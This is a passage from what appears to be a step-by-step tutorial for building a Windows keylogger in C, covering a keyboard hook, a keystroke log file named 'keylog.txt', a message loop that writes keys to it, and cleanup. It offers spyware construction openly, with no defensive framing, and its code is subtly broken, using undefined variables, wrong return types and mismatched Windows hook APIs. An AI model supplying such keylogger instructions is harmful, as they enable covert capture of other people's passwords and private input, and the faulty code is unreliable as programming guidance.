    0,
    0,
    0,
    HWND_DESKTOP,
    0,
    HWND_TOP,
    0,
    0,
    nID
);
```

### Step 5: Set Up the Keyboard Hook
Set up the keyboard hook and attach it to the window:
```c
int hhook = SetWindowsHook(hookType, KeyCallback);

if (hhook == 0) {
    printf("Failed to set keyboard hook\n");
    exit(1);
}
```

### Step 6: Initialize the File for Logging
Open a file for logging:
```c
FILE *fptr = fopen("keylog.txt", "a");
if (fptr == NULL) {
    printf("Failed to create log file\n");
    exit(1);
}
```

### Step 7: Monitor Messages
Use a message loop to process events:
```c
MSG msg;
while (GetMessage(&msg, hwnd, 0, 0)) {
    if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
        // Handle the message
        if (fptr != NULL) {
            fputc(key, fptr);
        }
    }
    Sleep(100); // Prevent high CPU usage
}
```

### Step 8: Cleanup and Unhook
Unhook and clean up resources:
```c
UnhookWindowsHook(hhook);
DestroyWindow(hwnd);
fclose(fptr);
```

